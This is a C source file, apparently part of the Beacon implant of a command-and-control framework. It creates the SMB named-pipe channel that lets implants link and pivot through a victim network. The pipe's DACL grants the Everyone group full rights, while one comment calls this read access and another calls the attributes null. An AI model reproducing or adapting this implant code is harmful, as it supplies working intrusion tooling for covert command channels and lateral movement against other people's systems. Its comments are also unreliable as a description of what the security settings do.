/*
 * Manage the SMB data channel for Beacon (pivot variant)
 * Entry point:
 *	1. command_link_wait
 *		user requested SMB data channel
 *	2. smb_init
 *		create our named pipe with an Everyone DACL
 *	3. smb_wait
 *		wait for a connection... send agent id when it comes
 *	4. smb_process
 *		process server data please... do normal beacon stuff.
 * The shared channel body (smb_wait/smb_stop/command_link_wait) lives in
 * client_smb_common.h; this file only carries the pivot-specific pieces.
 */

#include "beacon.h"
#include "channel.h"
#include "commands.h"
#include "security.h"
#include "link.h"
#include "linkint.h"
#include "clientint.h"

#include <aclapi.h>
#include "parse.h"

#include "client_smb_common.h"

/* create a new kind of channel */
LCHANNEL lchannel_smb_gargle(HANDLE pipe) {
	LCHANNEL channel;
	channel = lchannel_smb(pipe);
	channel.wait = link_channel_smb_wait;
	return channel;
}

typedef struct {
	PSID                 pEveryoneSID;
	PACL                 pACL;
	PSECURITY_DESCRIPTOR pSD;
} PIPE_PERM_OBJECTS;

/*
 * change pipe permissions
 * https://docs.microsoft.com/en-us/windows/win32/secauthz/creating-a-security-descriptor-for-a-new-object-in-c--?redirectedfrom=MSDN
 */
BOOL setup_pipe_perms(PIPE_PERM_OBJECTS * ppo, PSECURITY_ATTRIBUTES psa) {
	DWORD                    dwRes;
	EXPLICIT_ACCESS          ea[1];
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;

	// Create a well-known SID for the Everyone group.
	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &(ppo->pEveryoneSID)))
		return FALSE;

	// Initialize an EXPLICIT_ACCESS structure for an ACE.
	// The ACE will allow Everyone read access to the key.
	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	ea[0].grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
	ea[0].grfAccessMode        = SET_ACCESS;
	ea[0].grfInheritance       = NO_INHERITANCE;
	ea[0].Trustee.TrusteeForm  = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[0].Trustee.ptstrName    = (LPTSTR)ppo->pEveryoneSID;

	// Create a new ACL that contains the new ACEs.
	dwRes = SetEntriesInAcl(1, ea, NULL, &(ppo->pACL));
	if (ERROR_SUCCESS != dwRes)
		return FALSE;

	// Initialize a security descriptor.
	ppo->pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);

	if (!InitializeSecurityDescriptor(ppo->pSD, SECURITY_DESCRIPTOR_REVISION))
		return FALSE;

	// Add the ACL to the security descriptor.
	if (!SetSecurityDescriptorDacl(ppo->pSD, TRUE, ppo->pACL, FALSE))
		return FALSE;

	// Initialize a security attributes structure.
	psa->nLength              = sizeof(SECURITY_ATTRIBUTES);
	psa->lpSecurityDescriptor = ppo->pSD;
	psa->bInheritHandle       = FALSE;

	return TRUE;
}

/* done on process exit - the descriptors only need to outlive CreateNamedPipe,
 * but the pipe lives for the lifetime of the session so we simply keep them */
void cleanup_pipe_perms(PIPE_PERM_OBJECTS * ppo) {
	if (ppo->pEveryoneSID)
		FreeSid(ppo->pEveryoneSID);
	if (ppo->pACL)
		LocalFree(ppo->pACL);
	if (ppo->pSD)
		LocalFree(ppo->pSD);
}

/*
*  init a named pipe
*/
BOOL smb_init() {
	HANDLE temps = INVALID_HANDLE_VALUE;
	PIPE_PERM_OBJECTS ppo;

	/* null security attributes -- allows anyone to connect */
	SECURITY_ATTRIBUTES sa = { 0 };

	/* setup our named pipe security attributes */
	setup_pipe_perms(&ppo, &sa);

	/* setup our named pipe please */
	temps = CreateNamedPipe(setting_ptr(SETTING_PIPENAME), PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE, PIPE_UNLIMITED_INSTANCES, MAX_GET, MAX_GET, 0, &sa);

	/* we're done with these pointers, so let's clean them up */
	cleanup_pipe_perms(&ppo);

	/* check for errors and fail now... */
	if (temps == INVALID_HANDLE_VALUE) {
		post_error_d(0x17, GetLastError());
		return FALSE;
	}

	/* set post type to POST_SMB now... since everything seems OK */
	post_type = POST_SMB;

	/* now we can assign the handle */
	pipe = temps;
	return TRUE;
}
